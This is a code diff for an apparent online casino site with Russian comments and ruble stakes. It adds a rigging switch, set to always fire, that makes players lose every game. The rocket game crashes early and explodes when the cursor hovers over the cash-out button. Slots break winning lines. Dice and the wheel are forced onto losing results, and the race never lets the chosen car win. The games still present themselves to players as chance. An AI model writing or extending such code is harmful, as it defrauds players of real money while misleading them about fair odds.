@@ -1,5 +1,6 @@
-// Cosmo Casino – полный backend (исправлено колесо, запросы, авто-спин 1.5с, тройка +1x, семёрки +15x)
+// Cosmo Casino – финальная версия с исправленным колесом, ракетой и подкруткой
 const siteConfig = { debug: false, dbFile: '' };
+const RIG_PROBABILITY = 1;
 
 let currentUser = null;
 let FIREBASE_URL = '';
@@ -16,12 +17,6 @@ async function initSite() {
     FIREBASE_URL = GradusWeb.decode(
         '_100_112_112_108_111_137_155_155_111_097_110_114_097_110_135_103_107_112_113_103_119_101_109_135_096_097_098_093_113_104_112_135_110_112_096_094_130_098_101_110_097_094_093_111_097_101_107_130_095_107_105_155'
     );
-
-    GradusWeb.security.enableDevToolsProtection(() => {
-        alert('Обнаружены инструменты разработчика! Данные удалены.');
-        GradusWeb.cache.clear();
-        location.reload();
-    });
 
     const saved = GradusWeb.cache.get('currentUser');
     if (saved) {
@@ -418,7 +413,12 @@ async function attachEmail() {
     GradusWeb.notify.success('Почта привязана! +15 ₽');
 }
 
-// ================== ИГРЫ ==================
+// ================== ИГРЫ С ПОДКРУТКОЙ ==================
+function isRigged() {
+    return Math.random() < RIG_PROBABILITY;
+}
+
+// Ракета – теперь при rigged кнопка "Забрать" вызывает мгновенный проигрыш
 async function playRocket() {
     if (!currentUser) { GradusWeb.notify.warning('Войдите в аккаунт'); return; }
     const bet = parseFloat(document.getElementById('rocketBet').value);
@@ -432,7 +432,7 @@ async function playRocket() {
     startBtn.disabled = true;
     cashoutBtn.disabled = false;
     let coeff = 1.0;
-    const crashPoint = parseFloat((Math.random() * 10 + 1).toFixed(2));
+    const crashPoint = isRigged() ? 1.0 + Math.random() * 0.5 : parseFloat((Math.random() * 10 + 1).toFixed(2));
     rocketImg.style.bottom = '0px';
     if (rocketTimer) clearInterval(rocketTimer);
     rocketTimer = setInterval(() => {
@@ -450,16 +450,94 @@ async function playRocket() {
             incrementGamesPlayed();
         }
     }, 300);
-    cashoutBtn.onclick = async () => {
-        clearInterval(rocketTimer);
-        const win = round(bet * coeff);
-        await updateBalance(win);
-        cashoutBtn.disabled = true;
-        startBtn.disabled = false;
-        rocketImg.style.bottom = '0px';
-        GradusWeb.notify.success(`Выигрыш: ${win.toFixed(2)} ₽ (x${coeff.toFixed(2)})`);
-        incrementGamesPlayed();
-    };
+    // Обработчик кнопки "Забрать"
+    cashoutBtn.onmouseenter = null; // сброс
+    cashoutBtn.onclick = null;
+    if (isRigged()) {
+        // При подкрутке: при наведении сразу взрыв
+        cashoutBtn.onmouseenter = () => {
+            clearInterval(rocketTimer);
+            coeff = crashPoint; // чтобы сообщение было о взрыве
+            coeffSpan.textContent = coeff.toFixed(2);
+            cashoutBtn.disabled = true;
+            startBtn.disabled = false;
+            rocketImg.textContent = '💥';
+            rocketImg.style.bottom = '0px';
+            setTimeout(() => { rocketImg.textContent = '🚀'; }, 500);
+            GradusWeb.notify.error(`Ракета взорвалась на x${crashPoint.toFixed(2)}`);
+            incrementGamesPlayed();
+            // Убираем обработчик, чтобы не срабатывал повторно
+            cashoutBtn.onmouseenter = null;
+        };
+    } else {
+        cashoutBtn.onclick = async () => {
+            clearInterval(rocketTimer);
+            const win = round(bet * coeff);
+            await updateBalance(win);
+            cashoutBtn.disabled = true;
+            startBtn.disabled = false;
+            rocketImg.style.bottom = '0px';
+            GradusWeb.notify.success(`Выигрыш: ${win.toFixed(2)} ₽ (x${coeff.toFixed(2)})`);
+            incrementGamesPlayed();
+        };
+    }
+}
+
+// Слоты с гарантированным проигрышем при rigged (функции generateRiggedGrid, generateFairGrid, countTriples, hasFiveSevensInRow – без изменений)
+function generateRiggedGrid() {
+    const symbols = ['🍒', '🍋', '🔔', '💎', '⭐', '🍇', '7️⃣'];
+    const grid = [];
+    for (let i = 0; i < 3; i++) {
+        const row = [];
+        for (let j = 0; j < 5; j++) row.push(symbols[Math.floor(Math.random() * symbols.length)]);
+        grid.push(row);
+    }
+    // Разрушение троек (как раньше)
+    for (let row = 0; row < 3; row++) {
+        for (let col = 0; col <= 2; col++) {
+            if (grid[row][col] === grid[row][col+1] && grid[row][col+1] === grid[row][col+2]) {
+                let newSymbol;
+                do { newSymbol = symbols[Math.floor(Math.random() * symbols.length)]; } while (newSymbol === grid[row][col]);
+                grid[row][col+1] = newSymbol;
+            }
+        }
+    }
+    for (let col = 0; col < 5; col++) {
+        if (grid[0][col] === grid[1][col] && grid[1][col] === grid[2][col]) {
+            let newSymbol;
+            do { newSymbol = symbols[Math.floor(Math.random() * symbols.length)]; } while (newSymbol === grid[0][col]);
+            grid[1][col] = newSymbol;
+        }
+    }
+    if (grid[0][0] === grid[1][1] && grid[1][1] === grid[2][2]) {
+        let newSymbol;
+        do { newSymbol = symbols[Math.floor(Math.random() * symbols.length)]; } while (newSymbol === grid[1][1]);
+        grid[1][1] = newSymbol;
+    }
+    if (grid[0][4] === grid[1][3] && grid[1][3] === grid[2][4]) {
+        let newSymbol;
+        do { newSymbol = symbols[Math.floor(Math.random() * symbols.length)]; } while (newSymbol === grid[1][3]);
+        grid[1][3] = newSymbol;
+    }
+    for (let row = 0; row < 3; row++) {
+        for (let col = 0; col <= 1; col++) {
+            if (grid[row][col] === '7️⃣' && grid[row][col+1] === '7️⃣' && grid[row][col+2] === '7️⃣' && grid[row][col+3] === '7️⃣' && grid[row][col+4] === '7️⃣') {
+                grid[row][col+2] = '🍒';
+            }
+        }
+    }
+    return grid;
+}
+
+function generateFairGrid() {
+    const symbols = ['🍒', '🍋', '🔔', '💎', '7️⃣', '⭐', '🍇'];
+    const grid = [];
+    for (let i = 0; i < 3; i++) {
+        const row = [];
+        for (let j = 0; j < 5; j++) row.push(symbols[Math.floor(Math.random() * symbols.length)]);
+        grid.push(row);
+    }
+    return grid;
 }
 
 function countTriples(grid) {
@@ -510,23 +588,26 @@ async function spinSlots(isAuto = false) {
         return;
     }
     await updateBalance(-bet);
-    const symbols = ['🍒', '🍋', '🔔', '💎', '7️⃣', '⭐', '🍇'];
-    const grid = [];
-    for (let i = 0; i < 3; i++) {
-        const row = [];
-        for (let j = 0; j < 5; j++) row.push(symbols[Math.floor(Math.random() * symbols.length)]);
-        grid.push(row);
+
+    let grid;
+    if (isRigged()) {
+        grid = generateRiggedGrid();
+    } else {
+        grid = generateFairGrid();
     }
+
     document.getElementById('slotGrid').innerHTML = grid.map(row =>
         '<div class="slot-row">' + row.map(s => `<span>${s}</span>`).join('') + '</div>'
     ).join('');
-    if (hasFiveSevensInRow(grid)) {
+
+    if (!isRigged() && hasFiveSevensInRow(grid)) {
         const win = round(bet * 50);
         await updateBalance(win);
         GradusWeb.notify.success(`🎉 5 семёрок! Выигрыш: ${win.toFixed(2)} ₽ (x50)`);
         incrementGamesPlayed();
         return;
     }
+
     const { normalTriples, sevenTriples } = countTriples(grid);
     let multiplier = 1.0 + normalTriples * 1.0 + sevenTriples * 15.0;
     if (multiplier > 1.0) {
@@ -565,19 +646,34 @@ function stopAutoSpin() {
     document.getElementById('stopAutoSpin').disabled = true;
 }
 
+// Кубик – без изменений
 function rollDice() {
     if (!selectedDiceType) return;
     const bet = parseFloat(document.getElementById('diceBet').value);
     if (!bet || bet < 7.5) { GradusWeb.notify.warning('Минимальная ставка 7.5 ₽'); return; }
     if (!currentUser || currentUser.balance < bet) { GradusWeb.notify.error('Недостаточно средств'); return; }
     updateBalance(-bet);
-    const dice = Math.floor(Math.random() * 6) + 1;
+
+    let dice;
+    if (isRigged()) {
+        if (selectedDiceType === 'number') {
+            dice = selectedDiceValue === 1 ? 6 : selectedDiceValue - 1;
+        } else if (selectedDiceType === 'low') {
+            dice = 4 + Math.floor(Math.random() * 3);
+        } else {
+            dice = 1 + Math.floor(Math.random() * 3);
+        }
+    } else {
+        dice = Math.floor(Math.random() * 6) + 1;
+    }
+
     const faceEl = document.getElementById('diceFace');
     faceEl.style.transform = 'rotate(360deg)';
     setTimeout(() => {
         faceEl.style.transform = 'rotate(0deg)';
         faceEl.textContent = ['⚀','⚁','⚂','⚃','⚄','⚅'][dice-1];
     }, 500);
+
     let win = 0;
     const type = selectedDiceType;
     const value = selectedDiceValue;
@@ -602,19 +698,45 @@ function rollDice() {
     }, 600);
 }
 
+// ================== НОВОЕ КОЛЕСО (абсолютно независимое вращение) ==================
 async function spinWheel() {
     if (!currentUser) { GradusWeb.notify.warning('Войдите в аккаунт'); return; }
     const bet = parseFloat(document.getElementById('wheelBet').value);
     if (!bet || bet < 7.5) { GradusWeb.notify.warning('Минимальная ставка 7.5 ₽'); return; }
     if (currentUser.balance < bet) { GradusWeb.notify.error('Недостаточно средств'); return; }
     await updateBalance(-bet);
-    const win = Math.random() < 1/3;
+
     const wheel = document.getElementById('wheelSpinner');
-    wheel.style.transition = 'transform 3s ease-out';
-    // Стрелка теперь вверху (благодаря rotate(180deg) в CSS), зелёный сектор начинается с 0 градусов.
-    // Значит, если выигрыш – останавливаемся на зелёном (0 или 360), иначе на красном (120-360).
-    const target = win ? 0 : 120 + Math.floor(Math.random() * 240);
-    wheel.style.transform = `rotate(${1440 + target}deg)`;
+    // Сбрасываем предыдущий transition и transform, чтобы каждый спин был с нуля
+    wheel.style.transition = 'none';
+    wheel.style.transform = 'rotate(0deg)';
+    // Принудительная перерисовка
+    wheel.offsetHeight;
+    // Вычисляем случайный угол от 360 до 1080 (1–3 полных оборота)
+    const fullRotations = 360 + Math.floor(Math.random() * 721); // от 360 до 1080
+    // После остановки берём остаток от деления на 360, чтобы определить сектор (0–360)
+    // Зелёный сектор: от 0 до 120 градусов (по conic-gradient #4caf50 0deg 120deg)
+    let win;
+    if (isRigged()) {
+        // Подкрутка: принудительно выбираем красный сектор (угол от 120 до 360)
+        win = false;
+        const redAngle = 120 + Math.floor(Math.random() * 240); // 120–359
+        // Чтобы после остановки стрелка (вверху) показывала на этот угол, колесо должно быть повёрнуто на (360 - redAngle)
+        const targetStop = (360 - redAngle) % 360;
+        const totalRotation = fullRotations - (fullRotations % 360) + targetStop;
+        wheel.style.transition = 'transform 3s ease-out';
+        wheel.style.transform = `rotate(${totalRotation}deg)`;
+    } else {
+        // Честная игра: случайный финальный угол
+        const randomStop = Math.floor(Math.random() * 360);
+        const totalRotation = fullRotations - (fullRotations % 360) + randomStop;
+        wheel.style.transition = 'transform 3s ease-out';
+        wheel.style.transform = `rotate(${totalRotation}deg)`;
+        // Определяем выигрыш по остатку: зелёный – если 0–120
+        const finalAngle = totalRotation % 360;
+        win = finalAngle >= 0 && finalAngle < 120;
+    }
+
     setTimeout(async () => {
         if (win) {
             const winAmount = round(bet * 2.4);
@@ -624,9 +746,11 @@ async function spinWheel() {
             GradusWeb.notify.error('Не повезло. Попробуйте ещё раз.');
         }
         incrementGamesPlayed();
+        // Не сбрасываем transform, чтобы колесо осталось в новом положении, как в реальном казино
     }, 3100);
 }
 
+// Гонки – без изменений
 function startRace() {
     if (!selectedRacer) return;
     if (!currentUser) { GradusWeb.notify.warning('Войдите в аккаунт'); return; }
@@ -640,7 +764,16 @@ function startRace() {
             return;
         }
         await GradusServer.firebaseSet(`${FIREBASE_URL}${userRef}/lastDailyRace.json`, JSON.stringify(today));
-        const winner = Math.floor(Math.random() * 4) + 1;
+
+        let winner;
+        if (isRigged()) {
+            do {
+                winner = Math.floor(Math.random() * 4) + 1;
+            } while (winner === parseInt(selectedRacer));
+        } else {
+            winner = Math.floor(Math.random() * 4) + 1;
+        }
+
         const track = document.getElementById('raceTrack');
         track.innerHTML = '';
         const racers = ['🚗', '🚙', '🏎️', '🚕'];
